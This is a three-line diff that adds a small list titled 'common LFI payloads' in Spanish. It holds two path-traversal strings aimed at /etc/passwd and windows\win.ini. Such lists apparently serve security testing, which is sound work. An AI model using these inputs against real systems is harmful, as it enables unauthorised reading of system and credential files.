@@ -1,0 +1,3 @@
+# Payloads LFI comunes
+../../etc/passwd
+..\..\windows\win.ini
